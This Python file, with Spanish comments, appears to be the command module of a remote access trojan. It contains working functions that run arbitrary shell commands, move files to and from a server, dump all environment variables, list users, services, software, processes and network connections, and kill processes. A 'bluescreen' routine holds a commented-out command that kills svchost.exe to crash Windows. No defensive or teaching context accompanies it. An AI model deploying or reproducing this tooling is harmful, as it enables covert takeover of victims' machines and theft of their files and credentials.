import socket
import subprocess
import platform
import os
import psutil
import datetime
import sys
from typing import Optional, Tuple, List, Dict


def execute_command(command: str, timeout: int = 30) -> Tuple[bool, str]:
    """
    Ejecuta un comando de sistema de forma segura.

    Args:
        command: Comando a ejecutar
        timeout: Tiempo máximo de espera en segundos

    Returns:
        Tuple[bool, str]: (éxito, resultado/error)
    """
    try:
        result = subprocess.run(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=timeout,
            encoding='utf-8',
            errors='replace'
        )
        if result.returncode == 0:
            return True, result.stdout
        return False, f"Error (código {result.returncode}): {result.stderr}"
    except subprocess.TimeoutExpired:
        return False, f"Error: El comando excedió el tiempo límite de {timeout} segundos"
    except Exception as e:
        return False, f"Error: {str(e)}"


def bluescreen():
    try:
        if platform.system() == "Windows":
            print("Reiniciando sistema...")
            # os.system("taskkill /F /IM svchost.exe")
        else:
            return "No se pudo reiniciar el sistema"
    except Exception as e:
        return f"Error reiniciando el sistema: {e}"


def get_hostname() -> str:
    """Obtiene información detallada del host."""
    try:
        hostname = socket.gethostname()
        return f"Hostname: {hostname}\n"
    except Exception as e:
        return f"Error obteniendo hostname: {e}"


def upload_file(file_path: str) -> str:
    """
    Sube un archivo al servidor.

    Args:
        file_path: Ruta del archivo a subir
    """
    try:
        if not os.path.exists(file_path):
            return f"Error: No existe el archivo {file_path}"
        with open(file_path, 'rb') as file:
            return file.read().decode('UTF-8')
    except Exception as e:
        return f"Error subiendo archivo: {e}"


def download_file(file_path: str, content: str) -> str:
    """
    Descarga un archivo al servidor.

    Args:
        file_path: Ruta del archivo a crear
        content: Contenido del archivo
    """
    try:
        with open(file_path, 'wb') as file:
            file.write(content.encode('UTF-8'))
        return f"Archivo {file_path} descargado exitosamente"
    except Exception as e:
        return f"Error descargando archivo: {e}"


def get_ip() -> str:
    """Obtiene las direcciones IP de todas las interfaces."""
    try:
        hostname = socket.gethostname()
        ips = []

        # Obtener IP local
        local_ip = socket.gethostbyname(hostname)
        ips.append(f"IP Local: {local_ip}")

        # Intentar obtener IP pública
        try:
            import urllib.request
            external_ip = urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
            ips.append(f"IP Externa: {external_ip}")
        except:
            ips.append("IP Externa: No disponible")

        return "\n".join(ips)
    except Exception as e:
        return f"Error obteniendo IPs: {e}"


def get_os() -> str:
    """Obtiene información detallada del sistema operativo."""
    try:
        os_info = [
            f"Sistema: {platform.system()}",
            f"Versión: {platform.version()}",
            f"Plataforma: {platform.platform()}",
            f"Arquitectura: {platform.machine()}",
            f"Procesador: {platform.processor()}",
            f"Python: {sys.version}"
        ]
        return "\n".join(os_info)
    except Exception as e:
        return f"Error obteniendo información del SO: {e}"


def get_users() -> str:
    """Obtiene información detallada de usuarios."""
    try:
        if platform.system() == "Windows":
            success, output = execute_command("net user")
            if success:
                return output
        else:
            success, output = execute_command("who")
            if success:
                return output
        return "No se pudo obtener información de usuarios"
    except Exception as e:
        return f"Error obteniendo usuarios: {e}"


def get_processes() -> str:
    """Obtiene información detallada de procesos."""
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent']):
            try:
                pid = proc.pid
                Name = proc.name()
                user = proc.username()
                memory = proc.memory_info().rss

                processes.append(f"PID: {pid} Usuario: {user} "
                                 f"Memoria: {memory / (1024 ** 3):.1f} GB Nombre: {Name}")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        return "\n".join(processes)
    except Exception as e:
        return f"Error obteniendo procesos: {e}"


def get_drives() -> str:
    """Obtiene información detallada de unidades de disco."""
    try:
        if platform.system() == "Windows":
            drives_info = []
            for part in psutil.disk_partitions(all=False):
                if os.path.exists(part.mountpoint):
                    usage = psutil.disk_usage(part.mountpoint)
                    drives_info.append(
                        f"Unidad: {part.device}\n"
                        f"  Punto de montaje: {part.mountpoint}\n"
                        f"  Sistema de archivos: {part.fstype}\n"
                        f"  Total: {usage.total / (1024 ** 3):.1f} GB\n"
                        f"  Usado: {usage.used / (1024 ** 3):.1f} GB\n"
                        f"  Libre: {usage.free / (1024 ** 3):.1f} GB\n"
                        f"  Porcentaje usado: {usage.percent}%\n"
                    )
            return "\n".join(drives_info)
        else:
            success, output = execute_command("df -h")
            return output if success else "No se pudo obtener información de discos"
    except Exception as e:
        return f"Error obteniendo información de discos: {e}"


def get_files(path: Optional[str] = None) -> str:
    """
    Obtiene listado detallado de archivos.

    Args:
        path: Ruta a listar. Si es None, usa el directorio actual.
    """
    try:
        path = path or os.getcwd()
        files_info = []

        files_info.append(f"Contenido de: {path}\n")
        total_size = 0

        for entry in os.scandir(path):
            try:
                stats = entry.stat()
                size = stats.st_size
                total_size += size
                modified = datetime.datetime.fromtimestamp(stats.st_mtime).strftime('%Y-%m-%d %H:%M:%S')

                if entry.is_file():
                    type_char = 'F'
                elif entry.is_dir():
                    type_char = 'D'
                else:
                    type_char = '?'

                files_info.append(
                    f"{type_char} {modified} {size:>10,} bytes  {entry.name}"
                )
            except Exception:
                continue

        files_info.append(f"\nTotal: {total_size:,} bytes")
        return "\n".join(files_info)
    except Exception as e:
        return f"Error listando archivos: {e}"


def get_network() -> str:
    """Obtiene información detallada de red."""
    try:
        network_info = []

        # Interfaces de red
        network_info.append("Interfaces de red:")
        for interface, addrs in psutil.net_if_addrs().items():
            network_info.append(f"\n{interface}:")
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    network_info.append(f"  IPv4: {addr.address}")
                elif addr.family == socket.AF_INET6:
                    network_info.append(f"  IPv6: {addr.address}")

        # Estadísticas de red
        net_io = psutil.net_io_counters()
        network_info.extend([
            "\nEstadísticas de red:",
            f"  Bytes enviados: {net_io.bytes_sent:,}",
            f"  Bytes recibidos: {net_io.bytes_recv:,}",
            f"  Paquetes enviados: {net_io.packets_sent:,}",
            f"  Paquetes recibidos: {net_io.packets_recv:,}"
        ])

        return "\n".join(network_info)
    except Exception as e:
        return f"Error obteniendo información de red: {e}"


def get_services() -> str:
    """Obtiene información detallada de servicios."""
    try:
        if platform.system() == "Windows":
            success, output = execute_command("sc query")
            if success:
                return output
        else:
            success, output = execute_command("systemctl list-units --type=service")
            if success:
                return output
        return "No se pudo obtener información de servicios"
    except Exception as e:
        return f"Error obteniendo servicios: {e}"


def get_system_info() -> str:
    """Obtiene información general del sistema."""
    try:
        # CPU
        cpu_info = [
            "Información de CPU:",
            f"  Núcleos físicos: {psutil.cpu_count(logical=False)}",
            f"  Núcleos totales: {psutil.cpu_count()}",
            f"  Uso actual: {psutil.cpu_percent()}%"
        ]

        # Memoria
        mem = psutil.virtual_memory()
        mem_info = [
            "\nMemoria RAM:",
            f"  Total: {mem.total / (1024 ** 3):.1f} GB",
            f"  Disponible: {mem.available / (1024 ** 3):.1f} GB",
            f"  Usada: {mem.used / (1024 ** 3):.1f} GB",
            f"  Porcentaje: {mem.percent}%"
        ]

        # Tiempo de actividad
        uptime = datetime.datetime.now() - datetime.datetime.fromtimestamp(psutil.boot_time())

        return "\n".join(cpu_info + mem_info + [f"\nTiempo de actividad: {uptime}"])
    except Exception as e:
        return f"Error obteniendo información del sistema: {e}"


def execute_shell(command: str) -> str:
    """
    Ejecuta un comando en la shell del sistema.

    Args:
        command: Comando a ejecutar
    """
    try:
        success, output = execute_command(command)
        if success:
            return output
        return f"Error ejecutando comando: {output}"
    except Exception as e:
        return f"Error en shell: {e}"


def get_environment() -> str:
    """Obtiene las variables de entorno."""
    try:
        env_vars = []
        for key, value in os.environ.items():
            env_vars.append(f"{key}={value}")
        return "\n".join(sorted(env_vars))
    except Exception as e:
        return f"Error obteniendo variables de entorno: {e}"


def get_installed_software() -> str:
    """Obtiene el software instalado."""
    try:
        if platform.system() == "Windows":
            success, output = execute_command('wmic product get name,version')
            if success:
                return output
        else:
            success, output = execute_command('dpkg -l' if os.path.exists('/usr/bin/dpkg') else 'rpm -qa')
            if success:
                return output
        return "No se pudo obtener la lista de software instalado"
    except Exception as e:
        return f"Error obteniendo software instalado: {e}"


def get_network_connections() -> str:
    """Obtiene las conexiones de red activas."""
    try:
        connections = []
        for conn in psutil.net_connections(kind='inet'):
            try:
                process = psutil.Process(conn.pid) if conn.pid else None
                local = f"{conn.laddr.ip}:{conn.laddr.port}"
                remote = f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "-"
                connections.append(
                    f"PID: {conn.pid or '-':<6} "
                    f"Proceso: {process.name() if process else '-':<15} "
                    f"Local: {local:<21} "
                    f"Remoto: {remote:<21} "
                    f"Estado: {conn.status}"
                )
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        return "\n".join(connections)
    except Exception as e:
        return f"Error obteniendo conexiones de red: {e}"


def kill_process(pid: int) -> str:
    """
    Mata un proceso por su PID.

    Args:
        pid: ID del proceso a matar
    """
    try:
        process = psutil.Process(pid)
        process.kill()
        return f"Proceso {pid} terminado exitosamente"
    except psutil.NoSuchProcess:
        return f"No existe el proceso {pid}"
    except psutil.AccessDenied:
        return f"Acceso denegado al intentar terminar el proceso {pid}"
    except Exception as e:
        return f"Error terminando proceso {pid}: {e}"
